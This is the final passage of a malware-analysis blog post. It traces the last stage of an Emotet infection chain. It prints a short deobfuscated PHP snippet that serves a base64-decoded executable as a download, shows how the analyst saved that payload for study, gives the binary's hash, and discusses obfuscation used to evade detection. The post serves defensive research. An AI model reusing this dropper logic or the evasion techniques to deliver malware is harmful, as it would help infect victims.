<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Content-Type: '</span> <span class="sy0">.</span> <span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">contentType_</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Content-Disposition: attachment;
filename=&quot;'</span> <span class="sy0">.</span> <span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">contentName_</span> <span class="sy0">.</span> <span class="st_h">'&quot;'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">header</span><span class="br0">&#40;</span><span class="st_h">'Content-Transfer-Encoding: binary'</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">return</span> <span class="kw3">base64_decode</span><span class="br0">&#40;</span><span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">content_</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The header is set to contain the content type, which is defined within the class, as well as the content disposition, which presumably is an <em>attachment</em>. The content encoding is <em>binary</em>. The content header of the file is base64 decoded using <em><a href="https://secure.php.net/manual/en/function.base64-decode.php">base64_decode</a></em>, which is the file that gets executed by the malicious macro.</p>
<p>During the analysis, the next stage (the file that is downloaded on the victim&#8217;s machine) is one that is preferably saved separately. This can be done by replacing the return value in the code by the two lines below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw3">file_put_contents</span><span class="br0">&#40;</span><span class="st0">&quot;/home/libra/Desktop/emotet/stage5.exe&quot;</span><span class="sy0">,</span> <span class="kw3">base64_decode</span><span class="br0">&#40;</span><span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">content_</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">return</span> <span class="st0">&quot;&quot;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>Finally, the class can be renamed, as is shown below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="re0">$downloadClass</span> <span class="sy0">=</span> <span class="kw2">new</span> DownloadClass<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">echo</span> <span class="re0">$downloadClass</span><span class="sy0">-&gt;</span><span class="me1">execute</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p><a name ="stage-5-the-binary"></a></p>
<h2><a href="#stage-5-the-binary">Stage 5 &#8211; The binary</a></h2>
<p>The binary that is downloaded from the site is an executable which is detected as Emotet, as can be seen <a href="https://www.virustotal.com/#/file/82fa35d4f8552c453b7ae2603738478cc22a266e687e481d02473ace810c7e1a/detection">here</a>. The SHA-256 hash of the file is given below.</p>
<pre>
82fa35d4f8552c453b7ae2603738478cc22a266e687e481d02473ace810c7e1a
</pre>
<p><a name ="conclusion"></a></p>
<h2><a href="#conclusion">Conclusion</a></h2>
<p>The obfuscation techniques within the macro were designed to avoid any form of string detection mechanisms. Due to the possible random layout, it is harder to write rules for the documents.</p>
<p>The PHP files that are on the server, also serve a similar purpose. By obfuscating the PHP code and executing the second PHP stage dynamically, it is harder for server owners to detect a malicious file in a customer&#8217;s web hosting. This way, the malicious websites try to remain online for a longer period of time. Signature detection is also easily evaded since the file can easily be obfuscated differently every so often.</p>
<p>All in all, it shows how much effort is put in to deliver an executable on the target, which then servers as yet another downloader for another stage within the infection process.</p>
<hr />
<p>To contact me, you can e-mail me at [info][at][maxkersten][dot][nl], or DM me on Twitter <a href="https://twitter.com/Libranalysis">@Libranalysis</a>.</p>
					</div><!-- .entry-content -->
			</div><!-- .inside-article -->
</article><!-- #post-## -->

				
								</main><!-- #main -->
	</div><!-- #primary -->

<div id="right-sidebar" itemtype="http://schema.org/WPSideBar" itemscope="itemscope" role="complementary" class="widget-area grid-25 tablet-grid-25 grid-parent sidebar">
	<div class="inside-right-sidebar">
				
		<aside id="recent-posts-2" class="widget inner-padding widget_recent_entries">
		<h4 class="widget-title">Recent Posts</h4>
		<ul>
											<li>
					<a href="https://maxkersten.nl/2024/11/27/ghidra-tip-0x08-scripting-with-microservices/">Ghidra Tip 0x08: Scripting with microservices</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/10/31/ghidra-tip-0x07-iterating-over-all-strings-in-a-program/">Ghidra Tip 0x07: Iterating over all strings in a Program</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/09/28/ghidra-tip-0x06-domainfiles-in-projects/">Ghidra Tip 0x06: DomainFiles in Projects</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/08/18/my-impression-of-tdi-2024-blackhat-usa-2024-and-defcon-32/">My impression of TDI 2024, BlackHat USA 2024 and DEFCON 32</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/06/30/ghidra-tip-0x05-headless-execution/">Ghidra Tip 0x05: Headless execution</a>
									</li>
					</ul>

		</aside><aside id="archives-2" class="widget inner-padding widget_archive"><h4 class="widget-title">Archives</h4>
			<ul>
					<li><a href='https://maxkersten.nl/2024/11/'>November 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/10/'>October 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/09/'>September 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/08/'>August 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/06/'>June 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/05/'>May 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/04/'>April 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/03/'>March 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/02/'>February 2024</a></li>
	<li><a href='https://maxkersten.nl/2023/08/'>August 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/05/'>May 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/04/'>April 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/03/'>March 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/02/'>February 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/01/'>January 2023</a></li>
	<li><a href='https://maxkersten.nl/2022/12/'>December 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/11/'>November 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/10/'>October 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/09/'>September 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/08/'>August 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/07/'>July 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/06/'>June 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/05/'>May 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/04/'>April 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/03/'>March 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/02/'>February 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/01/'>January 2022</a></li>
	<li><a href='https://maxkersten.nl/2021/12/'>December 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/11/'>November 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/10/'>October 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/09/'>September 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/08/'>August 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/07/'>July 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/06/'>June 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/05/'>May 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/04/'>April 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/03/'>March 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/02/'>February 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/01/'>January 2021</a></li>
	<li><a href='https://maxkersten.nl/2020/12/'>December 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/11/'>November 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/10/'>October 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/09/'>September 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/08/'>August 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/07/'>July 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/06/'>June 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/05/'>May 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/04/'>April 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/03/'>March 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/02/'>February 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/01/'>January 2020</a></li>
	<li><a href='https://maxkersten.nl/2019/12/'>December 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/11/'>November 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/10/'>October 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/09/'>September 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/08/'>August 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/07/'>July 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/06/'>June 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/05/'>May 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/04/'>April 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/03/'>March 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/02/'>February 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/01/'>January 2019</a></li>
	<li><a href='https://maxkersten.nl/2018/12/'>December 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/11/'>November 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/10/'>October 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/09/'>September 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/08/'>August 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/07/'>July 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/06/'>June 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/01/'>January 2018</a></li>
	<li><a href='https://maxkersten.nl/2017/10/'>October 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/07/'>July 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/06/'>June 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/05/'>May 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/04/'>April 2017</a></li>
			</ul>

			</aside><aside id="categories-2" class="widget inner-padding widget_categories"><h4 class="widget-title">Categories</h4>
			<ul>
					<li class="cat-item cat-item-10"><a href="https://maxkersten.nl/category/androidprojectcreator/">AndroidProjectCreator</a>
</li>
	<li class="cat-item cat-item-16"><a href="https://maxkersten.nl/category/api-clients/">API Clients</a>
</li>
	<li class="cat-item cat-item-9"><a href="https://maxkersten.nl/category/binary-analysis-course/">Binary Analysis Course</a>
</li>
	<li class="cat-item cat-item-4"><a href="https://maxkersten.nl/category/capricorn/">Capricorn</a>
</li>
	<li class="cat-item cat-item-18"><a href="https://maxkersten.nl/category/conferences/">Conferences</a>
</li>
	<li class="cat-item cat-item-3"><a href="https://maxkersten.nl/category/ethics/">Ethics</a>
</li>
	<li class="cat-item cat-item-2"><a href="https://maxkersten.nl/category/gemini/">Gemini</a>
</li>
	<li class="cat-item cat-item-6"><a href="https://maxkersten.nl/category/lectures/">Lectures</a>
</li>
	<li class="cat-item cat-item-19"><a href="https://maxkersten.nl/category/libras-ghidra-library/">Libra&#039;s Ghidra Library</a>
</li>
	<li class="cat-item cat-item-17"><a href="https://maxkersten.nl/category/m3/">m3</a>
</li>
	<li class="cat-item cat-item-15"><a href="https://maxkersten.nl/category/magecart/">MageCart</a>
</li>
	<li class="cat-item cat-item-13"><a href="https://maxkersten.nl/category/malpull/">MalPull</a>
</li>
	<li class="cat-item cat-item-8"><a href="https://maxkersten.nl/category/malware-analysis/">Malware Analysis</a>
</li>
	<li class="cat-item cat-item-14"><a href="https://maxkersten.nl/category/malwaretheflag/">MalwareTheFlag</a>
</li>
	<li class="cat-item cat-item-11"><a href="https://maxkersten.nl/category/responsible-disclosure/">Responsible Disclosure</a>
</li>
	<li class="cat-item cat-item-12"><a href="https://maxkersten.nl/category/reviews/">Reviews</a>
</li>
	<li class="cat-item cat-item-1"><a href="https://maxkersten.nl/category/uncategorized/">Uncategorized</a>
</li>
	<li class="cat-item cat-item-5"><a href="https://maxkersten.nl/category/web-hacking/">Web hacking</a>
</li>
	<li class="cat-item cat-item-7"><a href="https://maxkersten.nl/category/whitepapers/">Whitepapers</a>
</li>
			</ul>

			</aside>			</div><!-- .inside-right-sidebar -->
</div><!-- #secondary -->
	</div><!-- #content -->
</div><!-- #page -->
<div class="site-footer  ">
		<footer class="site-info" itemtype="http://schema.org/WPFooter" itemscope="itemscope">
		<div class="inside-site-info grid-container grid-parent">
						<div class="copyright-bar">
				<span class="copyright">&copy; 2024</span> &bull; <a href="https://generatepress.com" target="_blank" itemprop="url">GeneratePress</a>			</div>
		</div>
	</footer><!-- .site-info -->
	</div><!-- .site-footer -->

<a title="Scroll back to top" rel="nofollow" href="#" class="generate-back-to-top" style="opacity:0;visibility:hidden;" data-scroll-speed="400" data-start-scroll="300">
			<i class="fa fa-angle-up" aria-hidden="true"></i>
			<span class="screen-reader-text">Scroll back to top</span>
		</a><script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/navigation.min.js?ver=1.3.46" id="generate-navigation-js"></script>
<script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/dropdown.min.js?ver=1.3.46" id="generate-dropdown-js"></script>
<script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/back-to-top.min.js?ver=1.3.46" id="generate-back-to-top-js"></script>
<!--[if lt IE 9]>
<script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/html5shiv.min.js?ver=1.3.46" id="generate-html5-js"></script>
<![endif]-->

</body>
</html>